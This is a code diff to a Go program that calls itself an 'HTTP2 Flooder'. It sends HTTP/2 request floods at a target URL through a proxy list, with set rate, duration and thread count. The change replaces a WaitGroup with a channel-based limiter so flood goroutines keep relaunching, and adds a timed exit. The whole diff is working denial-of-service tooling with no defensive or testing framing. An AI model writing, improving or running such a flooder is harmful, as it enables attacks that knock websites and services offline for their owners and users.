@@ -11,7 +11,6 @@ import (
     "net"
     "bufio"
     "strings"
-    "sync"
     "github.com/valyala/fasthttp"
     "github.com/dgrr/http2"
 )
@@ -50,7 +49,10 @@ func FasthttpHTTPDialer(proxy string) fasthttp.DialFunc {
 	}
 }
 
-func http2flood(target string, rps int) {
+func http2flood(target string, rps int, limit chan struct{}) {
+    defer func() {
+		  <-limit
+    }()
     restart: 
     u, _ := url.Parse(target)
     hostname := u.Hostname()
@@ -115,9 +117,7 @@ func http2flood(target string, rps int) {
 
 
 func main() {
-    go func() {
-      rand.Seed(time.Now().UnixNano())
-    }()
+    rand.Seed(time.Now().UnixNano())
     if len(os.Args) < 6 {
         fmt.Println(fmt.Sprintf("\033[34mHTTP2 Flooder \033[0m- \033[33mMade by @udbnt\033[0m\n\033[31m%s target, duration, rps, proxylist, threads\033[0m", os.Args[0]))
         return
@@ -132,6 +132,12 @@ func main() {
     rps, _ = strconv.Atoi(os.Args[3])
     proxylist = os.Args[4]
     threads, _ = strconv.Atoi(os.Args[5])
+    currentThreads := 0
+    limit := make(chan struct{}, threads)
+    go func() {
+      time.Sleep(time.Duration(duration) * time.Second)
+      os.Exit(3)
+    }()
 
     file, err := os.Open(proxylist)
     if err != nil {
@@ -150,14 +156,13 @@ func main() {
         return
     }
 
-    var wg sync.WaitGroup
-    for i := 0; i < threads; i++ {
-        wg.Add(1)
-        defer wg.Done()
-        go http2flood(target, rps)
+    for {
+        limit <- struct{}{}
+        currentThreads++
+        go func() {
+        http2flood(target, rps, limit)
+        currentThreads--
+        }()
         time.Sleep(time.Duration(1) * time.Millisecond)
     }
-
-    time.Sleep(time.Duration(duration) * time.Second)
-    wg.Wait()
 }
